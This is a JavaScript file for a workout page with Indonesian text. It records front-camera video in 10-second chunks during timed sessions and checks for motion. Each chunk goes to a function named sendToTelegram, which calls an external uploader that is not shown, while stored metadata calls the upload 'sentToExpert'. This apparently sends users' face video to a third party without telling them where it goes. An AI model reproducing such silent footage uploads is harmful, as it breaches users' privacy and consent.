let stream = null;
let mediaRecorder = null;
let recordedChunks = [];
let timerInterval = null;
let timeRemaining = 60;
let currentSession = 1;
let isPaused = false;
let isRecording = false;
let recordingNumber = 1;
let recordingInterval = null;
let currentRecordingStartTime = 0;

const TOTAL_SESSIONS = 4;
const SESSION_DURATION = 60;
const RECORDING_INTERVAL = 10;

const videoPreview = document.getElementById('videoPreview');
const placeholderView = document.getElementById('placeholderView');
const timerDisplay = document.getElementById('timerDisplay');
const sessionInfo = document.getElementById('sessionInfo');
const recordingIndicator = document.getElementById('recordingIndicator');
const recordingStatus = document.getElementById('recordingStatus');
const startBtn = document.getElementById('startBtn');
const pauseBtn = document.getElementById('pauseBtn');
const resumeBtn = document.getElementById('resumeBtn');
const stopBtn = document.getElementById('stopBtn');

function updateSessionIndicators() {
  const dots = document.querySelectorAll('.session-dot');
  dots.forEach((dot, index) => {
    const session = index + 1;
    dot.classList.remove('active', 'completed');

    if (session < currentSession) {
      dot.classList.add('completed');
    } else if (session === currentSession) {
      dot.classList.add('active');
    }
  });
}

function formatTime(seconds) {
  const mins = Math.floor(seconds / 60);
  const secs = seconds % 60;
  return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
}

function updateTimerDisplay() {
  timerDisplay.textContent = formatTime(timeRemaining);
  sessionInfo.textContent = `Sesi ${currentSession} dari ${TOTAL_SESSIONS}`;
}

async function startCamera() {
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: 'user',
        width: { ideal: 1280 },
        height: { ideal: 1920 }
      },
      audio: false
    });

    videoPreview.srcObject = stream;
    videoPreview.style.display = 'block';
    placeholderView.style.display = 'none';

    if (typeof initMotionDetection === 'function') {
      initMotionDetection(videoPreview);
    }

    return true;
  } catch (error) {
    alert('Tidak dapat mengakses kamera. Pastikan Anda memberikan izin akses kamera.');
    console.error('Camera error:', error);
    return false;
  }
}

function stopCamera() {
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
    stream = null;
  }
  videoPreview.srcObject = null;
  videoPreview.style.display = 'none';
  placeholderView.style.display = 'flex';
}

async function startRecording() {
  if (!stream) return;

  recordedChunks = [];

  try {
    mediaRecorder = new MediaRecorder(stream, {
      mimeType: 'video/webm;codecs=vp9'
    });

    mediaRecorder.ondataavailable = (event) => {
      if (event.data.size > 0) {
        recordedChunks.push(event.data);
      }
    };

    mediaRecorder.onstop = async () => {
      const blob = new Blob(recordedChunks, { type: 'video/webm' });
      await saveRecording(blob);
      recordedChunks = [];
    };

    mediaRecorder.start();
    isRecording = true;
    currentRecordingStartTime = Date.now();
    recordingIndicator.style.display = 'block';
    updateRecordingStatus();

    recordingInterval = setTimeout(async () => {
      if (mediaRecorder && mediaRecorder.state === 'recording') {
        mediaRecorder.stop();
        isRecording = false;
        recordingIndicator.style.display = 'none';

        if (timeRemaining > 0 && !isPaused) {
          await new Promise(resolve => setTimeout(resolve, 100));
          await startRecording();
          recordingNumber++;
        }
      }
    }, RECORDING_INTERVAL * 1000);

  } catch (error) {
    console.error('Recording error:', error);
    alert('Tidak dapat merekam video.');
  }
}

function updateRecordingStatus() {
  if (isRecording) {
    const elapsed = Math.floor((Date.now() - currentRecordingStartTime) / 1000);
    const remaining = RECORDING_INTERVAL - elapsed;
    recordingStatus.textContent = `Merekam... ${remaining}s`;

    if (remaining > 0) {
      setTimeout(updateRecordingStatus, 1000);
    }
  } else {
    recordingStatus.textContent = '';
  }
}

function stopRecording() {
  if (recordingInterval) {
    clearTimeout(recordingInterval);
    recordingInterval = null;
  }

  if (mediaRecorder && mediaRecorder.state === 'recording') {
    mediaRecorder.stop();
  }

  isRecording = false;
  recordingIndicator.style.display = 'none';
  recordingStatus.textContent = '';
}

async function saveRecording(blob) {
  const recordings = JSON.parse(localStorage.getItem('workoutRecordings') || '[]');

  const recording = {
    session: currentSession,
    videoNumber: recordingNumber,
    timestamp: new Date().toISOString(),
    size: blob.size,
    sentToExpert: false
  };

  recordings.push(recording);
  localStorage.setItem('workoutRecordings', JSON.stringify(recordings));

  await sendToTelegram(blob, recording);
}

async function sendToTelegram(blob, metadata) {
  if (typeof sendChunkToServer === 'function') {
    sendChunkToServer(
      blob,
      metadata.session,
      metadata.videoNumber
    );
  }
}

function startTimer() {
  timerInterval = setInterval(() => {
    if (!isPaused) {
      timeRemaining--;
      updateTimerDisplay();

      if (typeof checkMotion === 'function') {
        const hasMotion = checkMotion();
        if (!hasMotion) {
          pauseWorkout(true);
          showMotionAlert();
        }
      }

      if (timeRemaining <= 0) {
        completeSession();
      }
    }
  }, 1000);
}

function stopTimer() {
  if (timerInterval) {
    clearInterval(timerInterval);
    timerInterval = null;
  }
}

function showMotionAlert() {
  alert('Anda terdeteksi tidak melakukan gerakan olahraga.\nPastikan HP menghadap Anda.\nKlik mulai ulang hitungan.');
}

async function startWorkout() {
  const cameraStarted = await startCamera();
  if (!cameraStarted) return;

  recordingNumber = 1;
  isPaused = false;
  updateSessionIndicators();
  startTimer();
  await startRecording();

  startBtn.style.display = 'none';
  pauseBtn.style.display = 'block';
  stopBtn.style.display = 'block';
}

function pauseWorkout(fromMotionDetection = false) {
  isPaused = true;
  stopRecording();

  pauseBtn.style.display = 'none';
  resumeBtn.style.display = 'block';
}

async function resumeWorkout() {
  isPaused = false;
  await startRecording();

  resumeBtn.style.display = 'none';
  pauseBtn.style.display = 'block';
}

function stopWorkout() {
  stopTimer();
  stopRecording();
  stopCamera();

  if (typeof stopMotionDetection === 'function') {
    stopMotionDetection();
  }

  alert('Latihan dihentikan.');
  resetWorkout();
}

async function completeSession() {
  stopTimer();
  stopRecording();

  if (currentSession < TOTAL_SESSIONS) {
    const continueNextSession = confirm(`Sesi ${currentSession} selesai!\n\nLanjut ke sesi ${currentSession + 1}?`);

    if (continueNextSession) {
      currentSession++;
      timeRemaining = SESSION_DURATION;
      recordingNumber = 1;
      updateTimerDisplay();
      updateSessionIndicators();
      await startRecording();
      startTimer();
    } else {
      completeAllSessions();
    }
  } else {
    completeAllSessions();
  }
}

function completeAllSessions() {
  stopTimer();
  stopRecording();
  stopCamera();

  if (typeof stopMotionDetection === 'function') {
    stopMotionDetection();
  }

  const workouts = JSON.parse(localStorage.getItem('workouts') || '[]');
  workouts.push({
    date: new Date().toISOString(),
    sessions: currentSession
  });
  localStorage.setItem('workouts', JSON.stringify(workouts));

  const today = new Date().toISOString().split('T')[0];
  const markedDates = JSON.parse(localStorage.getItem('markedDates') || '[]');
  if (!markedDates.includes(today)) {
    markedDates.push(today);
    localStorage.setItem('markedDates', JSON.stringify(markedDates));
  }

  alert(`Selamat! Semua sesi latihan hari ini selesai.\n\nTotal: ${currentSession} sesi\nVideo: ${recordingNumber} video`);
  resetWorkout();
  window.location.href = '/';
}

function resetWorkout() {
  currentSession = 1;
  timeRemaining = SESSION_DURATION;
  recordingNumber = 1;
  isPaused = false;
  isRecording = false;

  updateTimerDisplay();
  updateSessionIndicators();

  startBtn.style.display = 'block';
  pauseBtn.style.display = 'none';
  resumeBtn.style.display = 'none';
  stopBtn.style.display = 'none';
}

window.addEventListener('DOMContentLoaded', () => {
  updateTimerDisplay();
  updateSessionIndicators();
});

window.addEventListener('beforeunload', (e) => {
  if (isRecording || timerInterval) {
    e.preventDefault();
    e.returnValue = '';
  }
});
